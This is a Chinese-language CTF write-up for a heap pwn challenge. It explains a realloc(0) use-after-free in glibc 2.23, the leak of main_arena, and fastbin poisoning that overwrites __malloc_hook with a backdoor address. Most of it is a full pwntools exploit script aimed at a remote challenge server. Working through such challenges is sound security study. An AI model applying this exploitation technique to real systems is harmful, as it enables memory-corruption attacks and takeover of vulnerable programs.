## heap1 - Writeup

## 1. 题目概况

这道题目在平台上做的人较少，能找到的wp对于我这种基础较差的又比较难懂，所以对当前的我来说比较棘手

- **平台/赛事：** (例如：bugku)

- **难度：** (⭐×4/6)

- **主要考点：** (例如：relloc()的free功能，UAF，unsortbin，fastbin的特性，动态调试)

- **附件：** `pwn`, `libc.so.6`

  

## 2. 程序逻辑分析

通过 IDA 等工具静态分析，或通过 GDB 动态调试发现的问题。

- **漏洞函数：** `relloc(size)`
- **漏洞描述：**
  -  在使用relloc时，未限制size大小不能为零，从而导致在虽然在修改空间，实则空间被释放但指针仍旧在的块，这使得可以泄露（指针所指的块依旧可以打印）及修改被放入bins中的块的fd（也就是指向main_arear附近）；
  - 从而可以得到malloc_hook相对于这个泄露地址的偏移，因为这里泄露地址相对于main_arear的偏移可以得出，且main_arear和malloc_hook的偏移在libc2.23中是固定的，从而得到了malloc_hook的地址；
  - 根据malloc_hook的特性（malloc申请空间的时候，就会执行），我们的目的就是把backdoor的函数地址写在malloc_hook指向的地方，在这里也就决定了要伪造的fake_chunk的地址，这一步中有非常精细的几个动调，就是要把这个fake_chunk的size伪造成0x70的bit调试，感觉是这道题战术上最强的地方；
  - 利用relloc（0）在fastbin中串起fake_chunk；这时候通过申请三个块把原本在fastbin中的块重新申请出来，而且在申请fake_chunk这个块时实现了任意地址写；最后就是引燃这条拼接好的引线，pwn！

## 4. 完整 Exploit 脚本

使用 `pwntool 编写的脚本。代码块应保持整洁，好吧我这个并不简洁

Python

```
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context (os='linux', arch='amd64', log_level='debug')
exe = ELF("./pwn_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")
p = remote('171.80.2.169', '13643')
#p = process('./pwn_patched')
#gdb.attach(p)
backdoor = 0x400926
#申请第一个块
p.sendlineafter('Enter your choice: ',b'1')
p.sendlineafter('Enter index (0-9): ',b'0')
size = 0x90
p.sendlineafter('Enter chunk size (max 256 bytes): ',str(size).encode())
p.sendlineafter('bytes): ',b'')
#申请第二个隔离块
p.sendlineafter('Enter your choice: ',b'1')
p.sendlineafter('Enter index (0-9): ',b'1')
size_60 = 0x60
p.sendlineafter('Enter chunk size (max 256 bytes): ',str(size_60).encode())
p.sendlineafter('bytes): ',b'')
#申请第三个隔离块
p.sendlineafter('Enter your choice: ',b'1')
p.sendlineafter('Enter index (0-9): ',b'2')
p.sendlineafter('Enter chunk size (max 256 bytes): ',str(size_60).encode())
p.sendlineafter('bytes): ',b'')
#edit块0的大小，触发漏洞
p.sendlineafter('Enter your choice: ',b'2')
p.sendlineafter('Enter index (0-9): ',b'0')
p.sendlineafter('Enter new size (max 256 bytes): ','')
#尝试打印
p.sendlineafter('Enter your choice: ',b'4')
p.sendlineafter('Enter index (0-9): ',b'0')
p.recvuntil('Chunk at index 0: ')
leak = u64(p.recv(6).ljust(8,b'\x00')) 
main_arena = leak - 88
malloc_hook = main_arena - 0x10
print('leak_add = '+ hex(leak))
print('main_arena_add = ' + hex(main_arena))
print('malloc_hook = ' + hex(malloc_hook))
fake_add = malloc_hook - 11 - 8
#修改第二个块和第三个块的大小（用relloc进行free）
p.sendlineafter('Enter your choice: ',b'2')
p.sendlineafter('Enter index (0-9): ',b'1')
p.sendlineafter('Enter new size (max 256 bytes): ','')
p.sendlineafter('Enter your choice: ',b'2')
p.sendlineafter('Enter index (0-9): ',b'2')
p.sendlineafter('Enter new size (max 256 bytes): ','')
#把第一个块的fd指针指向fakechunk
p.sendlineafter('Enter your choice: ',b'2')
p.sendlineafter('Enter index (0-9): ',b'1')
p.sendlineafter('Enter new size (max 256 bytes): ',str(size_60).encode())
p.sendlineafter(' bytes): ',p64(fake_add))
#连着申请三个块，分别是被扔进fastbin的第三个块，第二个块，和fakechunk
p.sendlineafter('Enter your choice: ',b'1')
p.sendlineafter('Enter index (0-9): ',b'4')
p.sendlineafter('Enter chunk size (max 256 bytes): ',str(size_60).encode())
p.sendlineafter('bytes): ',b'aa')

p.sendlineafter('Enter your choice: ',b'1')
p.sendlineafter('Enter index (0-9): ',b'5')
p.sendlineafter('Enter chunk size (max 256 bytes): ',str(size_60).encode())
p.sendlineafter('bytes): ',b'aa')

p.sendlineafter('Enter your choice: ',b'1')
p.sendlineafter('Enter index (0-9): ',b'6')
p.sendlineafter('Enter chunk size (max 256 bytes): ',str(size_60).encode())
p.sendlineafter('bytes): ',b'a'*3 + p64(backdoor))
#点燃这一切
p.sendlineafter('Enter your choice: ',b'1')
p.sendlineafter('Enter index (0-9): ',b'7')
p.sendlineafter('Enter chunk size (max 256 bytes): ',str(size_60).encode())
#p.sendlineafter('bytes): ',b'aa')
#offect = malloc_hook_add - libc.symbols['__malloc_hook']
p.interactive()
```

## 6. 总结与反思（后面再写）

- **坑点总结：** 
- **新知识点：** 